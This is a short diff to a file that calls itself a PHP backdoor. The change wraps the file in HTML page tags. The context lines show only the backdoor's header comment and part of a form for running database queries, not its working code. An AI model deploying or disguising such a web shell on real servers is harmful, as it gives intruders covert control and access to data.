@@ -1,3 +1,4 @@
+<html><head></head><body>
 <?
 // a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\
 
@@ -69,3 +70,5 @@ database: <input type="text" name="db">  query: <input type="text" name="mquery"
 </form>
 
 <!--	http://michaeldaw.org	2006 	-->
+
+</body></html>
